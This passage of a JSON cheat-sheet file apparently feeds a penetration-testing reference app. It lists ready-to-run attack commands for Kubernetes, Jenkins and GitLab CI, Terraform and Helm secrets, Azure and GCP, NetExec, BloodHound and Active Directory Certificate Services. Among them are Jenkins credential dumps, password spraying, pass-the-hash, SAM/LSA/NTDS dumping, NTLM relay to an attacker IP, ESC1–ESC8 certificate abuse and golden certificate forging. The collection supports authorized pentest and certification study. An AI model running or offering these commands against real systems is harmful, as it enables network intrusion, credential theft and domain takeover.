            "title": "Kube-Hunter Internal Scan",
            "cmd": "kube-hunter --internal",
            "tags": [
              "tool"
            ],
            "desc": "Scan Kubernetes cluster from within a pod"
          },
          {
            "title": "Kube-Bench CIS Benchmark",
            "cmd": "kube-bench run --targets master,node",
            "tags": [
              "tool"
            ],
            "desc": "Run CIS Kubernetes Benchmark checks"
          },
          {
            "title": "Trivy Image Scan",
            "cmd": "trivy image <IMAGE_NAME>:<TAG>",
            "tags": [
              "essential"
            ],
            "desc": "Scan a container image for vulnerabilities"
          },
          {
            "title": "Trivy Filesystem Scan",
            "cmd": "trivy fs /path/to/project",
            "tags": [
              "tool"
            ],
            "desc": "Scan filesystem for vulnerabilities and misconfigurations"
          },
          {
            "title": "Trivy K8s Cluster Scan",
            "cmd": "trivy k8s --report summary cluster",
            "tags": [
              "tool"
            ],
            "desc": "Scan Kubernetes cluster for security issues"
          },
          {
            "title": "Docker Bench Security",
            "cmd": "docker run -it --net host --pid host --userns host --cap-add audit_control -v /var/lib:/var/lib -v /var/run/docker.sock:/var/run/docker.sock -v /etc:/etc --label docker_bench_security docker/docker-bench-security",
            "tags": [
              "tool"
            ],
            "desc": "Run Docker CIS Benchmark security audit"
          },
          {
            "title": "Falco Runtime Security",
            "cmd": "falco -r /etc/falco/falco_rules.yaml",
            "tags": [
              "advanced"
            ],
            "desc": "Runtime security monitoring for containers"
          },
          {
            "title": "Kubectl Token from Pod",
            "cmds": [
              "# From within a pod:",
              "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
              "APISERVER=https://kubernetes.default.svc",
              "curl -sk $APISERVER/api/v1/namespaces -H \"Authorization: Bearer $TOKEN\""
            ],
            "tags": [
              "essential"
            ],
            "desc": "Use service account token to query Kubernetes API from within a pod"
          }
        ]
      },
      {
        "name": "CI/CD Pipeline Attacks",
        "commands": [
          {
            "title": "Jenkins Script Console RCE",
            "cmd": "# Navigate to http://<TARGET_IP>:8080/script\n# Execute: println 'whoami'.execute().text",
            "tags": [
              "essential"
            ],
            "desc": "Execute system commands via Jenkins Groovy Script Console"
          },
          {
            "title": "Jenkins Credential Dump (Groovy)",
            "cmd": "# In Script Console:\ndef creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class, Jenkins.instance, null, null); creds.each { println it.username + ':' + it.password }",
            "tags": [
              "essential"
            ],
            "desc": "Dump all stored credentials from Jenkins via Groovy"
          },
          {
            "title": "Jenkins Decrypt Secret",
            "cmd": "# In Script Console:\nprintln(hudson.util.Secret.decrypt('{<ENCRYPTED_SECRET>}'))",
            "tags": [
              "essential"
            ],
            "desc": "Decrypt a Jenkins encrypted secret value"
          },
          {
            "title": "Jenkins Remote Code Execution",
            "cmd": "curl -X POST 'http://<TARGET_IP>:8080/scriptText' --data-urlencode 'script=println \"whoami\".execute().text' --user '<USER>:<PASS>'",
            "tags": [
              "essential"
            ],
            "desc": "Execute Groovy script via Jenkins API remotely"
          },
          {
            "title": "GitLab CI Token from Runner",
            "cmds": [
              "# On a GitLab Runner, check for:",
              "cat /etc/gitlab-runner/config.toml",
              "# Look for 'token' field in [[runners]] section"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Extract GitLab CI runner registration tokens"
          },
          {
            "title": "GitLab CI Variables",
            "cmd": "curl --header 'PRIVATE-TOKEN: <GITLAB_TOKEN>' 'https://<GITLAB_URL>/api/v4/projects/<PROJECT_ID>/variables'",
            "tags": [
              "essential"
            ],
            "desc": "List CI/CD variables (secrets) for a GitLab project"
          },
          {
            "title": "GitHub Actions Secrets Exposure",
            "cmds": [
              "# Check workflow files for secret references:",
              "# ${{ secrets.SECRET_NAME }}",
              "# Look for secrets leaked in logs or artifacts",
              "# Check .github/workflows/ for hardcoded values"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Identify GitHub Actions secret exposure vectors"
          },
          {
            "title": "GitHub Actions — Inject in PR",
            "cmds": [
              "# If workflows trigger on pull_request_target:",
              "# Fork repo, modify workflow to echo secrets",
              "# Submit PR to trigger workflow on target repo"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Exploit pull_request_target for secret exfiltration",
            "note": "Only in controlled/authorized testing scenarios"
          },
          {
            "title": "Terraform State Secrets",
            "cmds": [
              "# Check for remote state files:",
              "cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.password != null or .secret_key != null)'",
              "# S3 state: aws s3 cp s3://<BUCKET>/terraform.tfstate ."
            ],
            "tags": [
              "essential"
            ],
            "desc": "Extract secrets from Terraform state files"
          },
          {
            "title": "Terraform State from S3",
            "cmd": "aws s3 ls s3://<BUCKET> --recursive | grep tfstate && aws s3 cp s3://<BUCKET>/terraform.tfstate /tmp/",
            "tags": [
              "tool"
            ],
            "desc": "Download Terraform state file from S3 bucket"
          },
          {
            "title": "ArgoCD Token Extraction",
            "cmd": "kubectl get secret argocd-initial-admin-secret -n argocd -o jsonpath='{.data.password}' | base64 -d",
            "tags": [
              "tool"
            ],
            "desc": "Extract ArgoCD initial admin password from Kubernetes"
          },
          {
            "title": "Helm Release Secrets",
            "cmd": "kubectl get secrets -l owner=helm --all-namespaces -o json | jq '.items[].data' | jq -r 'to_entries[] | .value' | base64 -d | gunzip 2>/dev/null",
            "tags": [
              "advanced"
            ],
            "desc": "Decode Helm release secrets which may contain sensitive values"
          },
          {
            "title": "CI/CD Environment Variables",
            "cmds": [
              "env | sort",
              "printenv",
              "cat /proc/self/environ | tr '\\0' '\\n'"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Dump all environment variables in CI/CD pipeline context"
          },
          {
            "title": "Docker Registry Credentials",
            "cmds": [
              "cat ~/.docker/config.json",
              "cat /root/.docker/config.json",
              "# Base64 decode the 'auth' field for credentials"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Extract Docker registry credentials from config files"
          }
        ]
      },
      {
        "name": "Azure & GCP Basics",
        "commands": [
          {
            "title": "Azure Login",
            "desc": "Authenticate to Azure",
            "cmd": "az login",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Azure List Users",
            "desc": "Enumerate Azure AD users",
            "cmd": "az ad user list --query '[].{Name:displayName,UPN:userPrincipalName}' -o table",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Azure List VMs",
            "desc": "Enumerate VMs",
            "cmd": "az vm list -o table",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Azure Key Vaults",
            "desc": "Enumerate key vaults",
            "cmd": "az keyvault list -o table",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "GCloud Login",
            "desc": "Auth to GCP",
            "cmd": "gcloud auth login",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "GCloud Projects",
            "desc": "List projects",
            "cmd": "gcloud projects list",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "GCloud Instances",
            "desc": "List compute VMs",
            "cmd": "gcloud compute instances list",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "GCloud Secrets",
            "desc": "List secrets",
            "cmds": [
              "gcloud secrets list",
              "gcloud secrets versions access latest --secret=<SECRET>"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "ROADtools Azure AD",
            "desc": "Dump Azure AD",
            "cmds": [
              "roadrecon auth -u <USER>@<DOMAIN> -p '<PASS>'",
              "roadrecon gather",
              "roadrecon gui"
            ],
            "tags": [
              "tool"
            ]
          },
          {
            "title": "AzureHound",
            "desc": "BloodHound for Azure",
            "cmd": "azurehound -u <USER>@<DOMAIN> -p '<PASS>' list --tenant <TENANT_ID> -o azure.json",
            "tags": [
              "tool"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "netexec",
    "name": "NetExec / CrackMapExec",
    "icon": "🕸️",
    "description": "NetExec (nxc) and CrackMapExec for Active Directory enumeration, lateral movement, and credential attacks.",
    "subcategories": [
      {
        "name": "SMB Enumeration",
        "commands": [
          { "title": "NXC SMB Host Discovery", "desc": "Discover live hosts and OS info via SMB", "cmd": "nxc smb <SUBNET>/24", "tags": ["essential","tool"] },
          { "title": "NXC SMB Null Session", "desc": "Test null session authentication", "cmd": "nxc smb <TARGET_IP> -u '' -p ''", "tags": ["essential"] },
          { "title": "NXC SMB Guest Session", "desc": "Test guest authentication", "cmd": "nxc smb <TARGET_IP> -u 'guest' -p ''", "tags": ["essential"] },
          { "title": "NXC SMB Enumerate Shares", "desc": "List all SMB shares", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --shares", "tags": ["essential"] },
          { "title": "NXC SMB Enumerate Users", "desc": "List domain users via RID brute force", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --users", "tags": ["essential"] },
          { "title": "NXC SMB Enumerate Groups", "desc": "List domain groups", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --groups", "tags": ["essential"] },
          { "title": "NXC SMB Enumerate Logged Users", "desc": "Show currently logged in users", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --loggedon-users", "tags": ["essential"] },
          { "title": "NXC SMB Password Policy", "desc": "Get domain password policy", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --pass-pol", "tags": ["essential"] },
          { "title": "NXC SMB RID Brute", "desc": "Enumerate users via RID cycling (no creds needed)", "cmd": "nxc smb <TARGET_IP> -u '' -p '' --rid-brute", "tags": ["tool"] },
          { "title": "NXC SMB Enumerate Sessions", "desc": "Show active SMB sessions", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --sessions", "tags": ["essential"] },
          { "title": "NXC SMB Disks", "desc": "List local disks", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --disks", "tags": ["tool"] },
          { "title": "NXC SMB Local Groups", "desc": "Enumerate local groups", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --local-groups", "tags": ["essential"] },
          { "title": "NXC SMB Interfaces", "desc": "List network interfaces", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --interfaces", "tags": ["tool"] }
        ]
      },
      {
        "name": "SMB Authentication & Exec",
        "commands": [
          { "title": "NXC SMB Password Spray", "desc": "Password spray against multiple hosts", "cmd": "nxc smb <SUBNET>/24 -u <USER> -p '<PASS>' --continue-on-success", "tags": ["essential"] },
          { "title": "NXC SMB User List Spray", "desc": "Spray a password against a user list", "cmd": "nxc smb <TARGET_IP> -u users.txt -p '<PASS>' --continue-on-success", "tags": ["essential"] },
          { "title": "NXC SMB Pass the Hash", "desc": "Authenticate using NTLM hash", "cmd": "nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH>", "tags": ["essential"] },
          { "title": "NXC SMB Execute Command", "desc": "Run command via SMBExec", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami /all'", "tags": ["essential"] },
          { "title": "NXC SMB PowerShell Exec", "desc": "Run PowerShell command via SMB", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -X 'Get-Process'", "tags": ["essential"] },
          { "title": "NXC SMB WMI Exec", "desc": "Execute command via WMI", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami' --exec-method wmiexec", "tags": ["essential"] },
          { "title": "NXC SMB AT Exec", "desc": "Execute command via scheduled task", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami' --exec-method atexec", "tags": ["tool"] },
          { "title": "NXC SMB Kerberos Auth", "desc": "Authenticate using Kerberos ticket", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -k", "tags": ["tool"] },
          { "title": "NXC Local Auth", "desc": "Use local account instead of domain", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --local-auth", "tags": ["essential"] },
          { "title": "NXC SMB Check Admin", "desc": "Check if credentials have admin access", "cmd": "nxc smb <SUBNET>/24 -u <USER> -p '<PASS>' --local-auth", "tags": ["essential"], "note": "Pwn3d! = admin access confirmed" }
        ]
      },
      {
        "name": "SMB Modules",
        "commands": [
          { "title": "NXC SAM Dump", "desc": "Dump SAM database (local hashes)", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --sam", "tags": ["essential"] },
          { "title": "NXC LSA Dump", "desc": "Dump LSA secrets", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --lsa", "tags": ["essential"] },
          { "title": "NXC NTDS Dump", "desc": "Dump NTDS.dit (domain hashes) via DCSync", "cmd": "nxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds", "tags": ["essential"] },
          { "title": "NXC Mimikatz Module", "desc": "Run Mimikatz logonpasswords", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M mimikatz", "tags": ["tool"] },
          { "title": "NXC Lsassy Module", "desc": "Dump credentials with lsassy", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M lsassy", "tags": ["tool"] },
          { "title": "NXC Spider Shares", "desc": "Spider SMB shares for interesting files", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus", "tags": ["essential"] },
          { "title": "NXC GPP Passwords", "desc": "Search for GPP stored passwords", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M gpp_password", "tags": ["essential"] },
          { "title": "NXC GPP Auto-Login", "desc": "Find GPP autologin credentials", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M gpp_autologin", "tags": ["essential"] },
          { "title": "NXC Zerologon Check", "desc": "Check for Zerologon vulnerability", "cmd": "nxc smb <DC_IP> -u '' -p '' -M zerologon", "tags": ["tool"] },
          { "title": "NXC PetitPotam Check", "desc": "Check for PetitPotam vulnerability", "cmd": "nxc smb <DC_IP> -u '' -p '' -M petitpotam", "tags": ["tool"] },
          { "title": "NXC MS17-010 Check", "desc": "Check for EternalBlue vulnerability", "cmd": "nxc smb <TARGET_IP> -u '' -p '' -M ms17-010", "tags": ["essential"] },
          { "title": "NXC Printnightmare Check", "desc": "Check for PrintNightmare", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M printnightmare", "tags": ["tool"] },
          { "title": "NXC Put File", "desc": "Upload file to target share", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --put-file /local/file.txt '\\\\<SHARE>\\file.txt'", "tags": ["tool"] },
          { "title": "NXC Get File", "desc": "Download file from target share", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --get-file '\\\\<SHARE>\\file.txt' /local/file.txt", "tags": ["tool"] }
        ]
      },
      {
        "name": "WinRM / LDAP / MSSQL",
        "commands": [
          { "title": "NXC WinRM Auth Check", "desc": "Test WinRM authentication", "cmd": "nxc winrm <TARGET_IP> -u <USER> -p '<PASS>'", "tags": ["essential"] },
          { "title": "NXC WinRM Execute", "desc": "Run command over WinRM", "cmd": "nxc winrm <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami'", "tags": ["essential"] },
          { "title": "NXC WinRM Shell", "desc": "Get interactive shell via WinRM", "cmd": "nxc winrm <TARGET_IP> -u <USER> -p '<PASS>' --shell", "tags": ["essential"] },
          { "title": "NXC LDAP Enumerate", "desc": "LDAP enumeration with credentials", "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --query '(objectClass=user)' ''", "tags": ["tool"] },
          { "title": "NXC LDAP Kerberoast", "desc": "Find Kerberoastable users via LDAP", "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting output.txt", "tags": ["essential"] },
          { "title": "NXC LDAP ASREPRoast", "desc": "Find AS-REP roastable users", "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --asreproast output.txt", "tags": ["essential"] },
          { "title": "NXC LDAP Trusted For Delegation", "desc": "Find unconstrained delegation accounts", "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --trusted-for-delegation", "tags": ["essential"] },
          { "title": "NXC LDAP Password Not Required", "desc": "Find accounts with no password required", "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --password-not-required", "tags": ["essential"] },
          { "title": "NXC MSSQL Auth", "desc": "Authenticate to MSSQL", "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>'", "tags": ["essential"] },
          { "title": "NXC MSSQL Execute Query", "desc": "Run SQL query", "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -q 'SELECT name FROM master.dbo.sysdatabases'", "tags": ["essential"] },
          { "title": "NXC MSSQL OS Command", "desc": "Execute OS command via xp_cmdshell", "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami'", "tags": ["essential"] }
        ]
      }
    ]
  },
  {
    "id": "bloodhound",
    "name": "BloodHound & SharpHound",
    "icon": "🐕",
    "description": "BloodHound AD attack path analysis, SharpHound collection, and useful Cypher queries for privilege escalation paths.",
    "subcategories": [
      {
        "name": "SharpHound Collection",
        "commands": [
          { "title": "SharpHound All Collection", "desc": "Collect all data types", "cmd": "SharpHound.exe -c All --outputdirectory C:\\Temp", "tags": ["essential","tool"] },
          { "title": "SharpHound Default Collection", "desc": "Default collection (fastest)", "cmd": "SharpHound.exe -c Default", "tags": ["essential"] },
          { "title": "SharpHound DCOnly", "desc": "Only collect from DC (stealthy)", "cmd": "SharpHound.exe -c DCOnly", "tags": ["tool"] },
          { "title": "SharpHound with Domain", "desc": "Specify domain to collect from", "cmd": "SharpHound.exe -c All -d <DOMAIN>", "tags": ["essential"] },
          { "title": "SharpHound Custom DC", "desc": "Specify domain controller", "cmd": "SharpHound.exe -c All --DomainController <DC_IP> -d <DOMAIN>", "tags": ["tool"] },
          { "title": "SharpHound Stealth Mode", "desc": "Stealth collection using LDAP only", "cmd": "SharpHound.exe -c Stealth", "tags": ["advanced"] },
          { "title": "BloodHound.py Collection", "desc": "Remote collection from Linux", "cmd": "bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -dc <DC_IP> -c All --zip", "tags": ["essential","tool"] },
          { "title": "BloodHound.py via NTLM Hash", "desc": "Collection using pass-the-hash", "cmd": "bloodhound-python -u <USER> --hashes :<NTLM_HASH> -d <DOMAIN> -dc <DC_IP> -c All --zip", "tags": ["tool"] },
          { "title": "RustHound Collection", "desc": "Rust-based BloodHound collector", "cmd": "rusthound -d <DOMAIN> -u '<USER>@<DOMAIN>' -p '<PASS>' -i <DC_IP> -o /tmp/bh --zip", "tags": ["tool"] }
        ]
      },
      {
        "name": "BloodHound Setup",
        "commands": [
          { "title": "Start Neo4j", "desc": "Start Neo4j database for BloodHound", "cmd": "sudo neo4j start", "tags": ["essential"] },
          { "title": "Neo4j Console", "desc": "Open Neo4j web console", "cmd": "sudo neo4j console", "tags": ["tool"] },
          { "title": "BloodHound Start (Linux)", "desc": "Launch BloodHound GUI", "cmd": "bloodhound &", "tags": ["essential"] },
          { "title": "BloodHound CE Docker", "desc": "Run BloodHound Community Edition in Docker", "cmds": ["docker run -d -p 8080:8080 -p 7687:7687 -p 7474:7474 --name bloodhound specterops/bloodhound-ce"], "tags": ["tool"] },
          { "title": "Neo4j Clear Database", "desc": "Clear all BloodHound data from Neo4j", "cmd": "MATCH (n) DETACH DELETE n", "tags": ["tool"], "note": "Run in Neo4j browser at :7474" }
        ]
      },
      {
        "name": "Cypher Queries",
        "commands": [
          { "title": "Find All DA Paths from Owned", "desc": "Attack paths from owned users to Domain Admins", "cmd": "MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) RETURN p", "tags": ["essential"], "note": "Run in BloodHound raw query or Neo4j browser" },
          { "title": "Find Kerberoastable Users", "desc": "Users with SPNs (Kerberoastable)", "cmd": "MATCH (u:User {hasspn:true}) RETURN u.name, u.description ORDER BY u.name", "tags": ["essential"] },
          { "title": "Find AS-REP Roastable", "desc": "Users with pre-auth disabled", "cmd": "MATCH (u:User {dontreqpreauth:true}) RETURN u.name", "tags": ["essential"] },
          { "title": "Find Unconstrained Delegation", "desc": "Computers with unconstrained delegation", "cmd": "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name", "tags": ["essential"] },
          { "title": "Find Constrained Delegation", "desc": "Accounts with constrained delegation", "cmd": "MATCH (u) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate", "tags": ["essential"] },
          { "title": "Find Local Admin Paths", "desc": "Who has local admin on which computers", "cmd": "MATCH p=(u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name", "tags": ["essential"] },
          { "title": "Find High Value Targets", "desc": "Computers and users marked high value", "cmd": "MATCH (n {highvalue:true}) RETURN n.name, labels(n)", "tags": ["essential"] },
          { "title": "Find DCSync Rights", "desc": "Who can DCSync (DS-Replication-Get-Changes-All)", "cmd": "MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p", "tags": ["essential"] },
          { "title": "Find WriteDACL to Domain", "desc": "Accounts with WriteDACL on domain object", "cmd": "MATCH p=(n)-[:WriteDacl]->(d:Domain) RETURN p", "tags": ["advanced"] },
          { "title": "Find GenericAll on DA Group", "desc": "Who has GenericAll on Domain Admins", "cmd": "MATCH p=(n)-[:GenericAll]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'}) RETURN p", "tags": ["essential"] },
          { "title": "Find Shadow Credentials Path", "desc": "Accounts that can add KeyCredentialLink", "cmd": "MATCH p=(n)-[:AddKeyCredentialLink]->(m) RETURN p", "tags": ["advanced"] },
          { "title": "Shortest Path to DA", "desc": "Shortest path from any node to Domain Admin", "cmd": "MATCH p=shortestPath((n)-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) WHERE NOT n=g RETURN p LIMIT 10", "tags": ["essential"] },
          { "title": "Find All Groups for User", "desc": "All group memberships including nested", "cmd": "MATCH p=(u:User {name:'<USER>@<DOMAIN>'})-[:MemberOf*1..]->(g:Group) RETURN g.name", "tags": ["tool"] },
          { "title": "Find LAPS Readable", "desc": "Who can read LAPS passwords", "cmd": "MATCH p=(u)-[:ReadLAPSPassword]->(c:Computer) RETURN u.name, c.name", "tags": ["essential"] },
          { "title": "Find GMSA Readable", "desc": "Who can read GMSA passwords", "cmd": "MATCH p=(u)-[:ReadGMSAPassword]->(a:User) RETURN p", "tags": ["tool"] },
          { "title": "Find Owned Admins", "desc": "Owned accounts with admin rights", "cmd": "MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer) RETURN u.name, c.name", "tags": ["essential"] },
          { "title": "Find Password in Description", "desc": "Users with potential passwords in description", "cmd": "MATCH (u:User) WHERE u.description CONTAINS 'pass' OR u.description CONTAINS 'pwd' RETURN u.name, u.description", "tags": ["advanced"] }
        ]
      }
    ]
  },
  {
    "id": "adcs-attacks",
    "name": "ADCS — Certificate Services Attacks",
    "icon": "📜",
    "description": "Active Directory Certificate Services exploitation — ESC1 through ESC8 using Certipy, Certutil, and related tools.",
    "subcategories": [
      {
        "name": "Certipy Enumeration",
        "commands": [
          { "title": "Certipy Find Vulnerabilities", "desc": "Enumerate ADCS and find vulnerable templates", "cmd": "certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout", "tags": ["essential","tool"] },
          { "title": "Certipy Find All Templates", "desc": "List all certificate templates", "cmd": "certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -stdout", "tags": ["essential"] },
          { "title": "Certipy Find via Hash", "desc": "Enumerate ADCS with NTLM hash", "cmd": "certipy find -u '<USER>@<DOMAIN>' -hashes :<NTLM_HASH> -dc-ip <DC_IP> -vulnerable -stdout", "tags": ["tool"] },
          { "title": "Certify Find (Windows)", "desc": "Find vulnerable certificate templates from Windows", "cmd": "Certify.exe find /vulnerable", "tags": ["essential","tool"] },
          { "title": "Certify Find All (Windows)", "desc": "List all certificate templates from Windows", "cmd": "Certify.exe find", "tags": ["tool"] },
          { "title": "NXC LDAP ADCS Enum", "desc": "Find ADCS servers via NXC", "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M adcs", "tags": ["tool"] }
        ]
      },
      {
        "name": "ESC1 — SAN Impersonation",
        "commands": [
          { "title": "ESC1 Request as DA (Certipy)", "desc": "Request cert with DA UPN in SAN field", "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>'", "tags": ["essential"] },
          { "title": "ESC1 Auth with Certificate", "desc": "Authenticate using obtained certificate", "cmd": "certipy auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>", "tags": ["essential"] },
          { "title": "ESC1 Request (Certify)", "desc": "Request cert as another user (Windows)", "cmd": "Certify.exe request /ca:<CA_SERVER>\\<CA_NAME> /template:<TEMPLATE> /altname:administrator", "tags": ["tool"] },
          { "title": "Convert PEM to PFX", "desc": "Convert Certify output to PFX for use with Rubeus", "cmds": ["openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx"], "tags": ["essential"] }
        ]
      },
      {
        "name": "ESC2, ESC3, ESC4",
        "commands": [
          { "title": "ESC2 Any Purpose Template", "desc": "Any Purpose EKU allows auth — request cert with SAN", "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template '<ESC2_TEMPLATE>' -upn 'administrator@<DOMAIN>'", "tags": ["advanced"] },
          { "title": "ESC3 Enrollment Agent Request", "desc": "Step 1: Obtain enrollment agent certificate", "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template '<ESC3_TEMPLATE>'", "tags": ["advanced"] },
          { "title": "ESC3 On-Behalf-Of Request", "desc": "Step 2: Request cert on behalf of DA", "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template 'User' -on-behalf-of '<DOMAIN>\\administrator' -pfx agent.pfx", "tags": ["advanced"] },
          { "title": "ESC4 Template Write Abuse", "desc": "Modify template to be vulnerable (ESC1 config)", "cmd": "certipy template -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -template '<TEMPLATE>' -save-old", "tags": ["advanced"] }
        ]
      },
      {
        "name": "ESC6, ESC7, ESC8",
        "commands": [
          { "title": "ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2", "desc": "CA allows SAN in any template — request with UPN", "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template 'User' -upn 'administrator@<DOMAIN>'", "tags": ["advanced"] },
          { "title": "ESC7 Manage CA Rights", "desc": "Add ManageCA right to enable EDITF flag", "cmds": ["certipy ca -ca '<CA_NAME>' -add-officer <USER> -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP>", "certipy ca -ca '<CA_NAME>' -enable-template 'SubCA' -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP>"], "tags": ["advanced"] },
          { "title": "ESC8 Web Enrollment NTLM Relay", "desc": "Relay DC$ auth to ADCS HTTP enrollment", "cmds": ["ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'", "coercer coerce -u <USER> -p '<PASS>' -d <DOMAIN> -l <ATTACKER_IP> -t <DC_IP>"], "tags": ["advanced"] },
          { "title": "Golden Certificate (Certipy)", "desc": "Forge certificate using stolen CA key", "cmd": "certipy forge -ca-pfx ca.pfx -upn 'administrator@<DOMAIN>' -subject 'CN=Administrator'", "tags": ["advanced"] }
        ]
      },
      {
        "name": "Certificate Authentication",
        "commands": [
          { "title": "Certipy Auth PKINIT", "desc": "Authenticate using certificate to get TGT + NTLM hash", "cmd": "certipy auth -pfx <USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP>", "tags": ["essential"] },
          { "title": "Rubeus PKINIT Auth", "desc": "Use certificate for Kerberos auth (Windows)", "cmd": "Rubeus.exe asktgt /user:<USER> /certificate:<CERT.pfx> /password:<PFX_PASS> /ptt", "tags": ["tool"] },
          { "title": "PassTheCert LDAP", "desc": "Use certificate to authenticate to LDAP", "cmd": "passthecert.py -action whoami -crt <USER>.crt -key <USER>.key -domain <DOMAIN> -dc-ip <DC_IP>", "tags": ["advanced"] },
          { "title": "PassTheCert Add DA", "desc": "Add user to Domain Admins via cert auth", "cmd": "passthecert.py -action modify_user -crt <USER>.crt -key <USER>.key -domain <DOMAIN> -dc-ip <DC_IP> -target <USER_TO_PROMOTE> -elevate", "tags": ["advanced"] }
        ]
      }
    ]
  },
  {
    "id": "service-exploitation",
    "name": "Network Service Exploitation",
    "icon": "🔌",
    "description": "Service-specific exploitation techniques for common ports found during OSCP-style engagements.",
    "subcategories": [
      {
        "name": "FTP (21)",
        "commands": [
          { "title": "FTP Anonymous Login", "desc": "Test anonymous FTP access", "cmd": "ftp <TARGET_IP>", "tags": ["essential"], "note": "Username: anonymous, Password: anything or blank" },
          { "title": "FTP List Files Recursively", "desc": "List all files recursively after login", "cmd": "wget -r --no-passive ftp://anonymous:anonymous@<TARGET_IP>/", "tags": ["essential"] },
          { "title": "Hydra FTP Brute Force", "desc": "Brute force FTP credentials", "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>", "tags": ["tool"] },
          { "title": "FTP Bounce Scan", "desc": "Use FTP bounce for port scanning", "cmd": "nmap -b anonymous@<FTP_IP> <TARGET_IP>", "tags": ["advanced"] },
          { "title": "FTP Binary Transfer", "desc": "Transfer binary file (avoid corruption)", "cmd": "ftp> binary", "tags": ["essential"], "note": "Run inside FTP session before transferring executables" },
